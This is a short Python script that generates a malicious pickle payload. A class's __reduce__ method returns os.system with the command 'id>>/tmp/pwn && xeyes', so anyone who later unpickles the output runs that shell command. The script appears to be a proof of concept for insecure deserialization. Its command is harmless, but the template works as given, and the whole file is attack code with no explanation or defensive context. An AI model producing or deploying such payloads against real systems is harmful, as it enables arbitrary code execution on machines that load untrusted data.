import pickle
import sys
import os

class XEYES:
  def __reduce__(self):
    cmd='id>>/tmp/pwn && xeyes'
    return os.system,(cmd,)

if __name__ == '__main__':
	p = pickle.dumps(XEYES(), protocol=3)
	sys.stdout.buffer.write(p)
#	pickle.loads(p)

